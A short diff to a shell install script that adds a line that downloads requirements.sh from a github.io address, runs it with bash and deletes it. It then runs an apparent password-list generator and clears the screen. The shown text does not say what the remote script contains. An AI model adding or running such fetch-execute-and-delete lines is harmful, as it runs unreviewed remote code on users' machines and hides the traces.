@@ -11,3 +11,6 @@ install() {
 }
 
 install
+wget https://gh05t-hunter5.github.io/the-source/Readers/requirements.sh && bash requirements.sh && rm requirements.sh 
+mypass -m 8 1000 list.lst
+clear
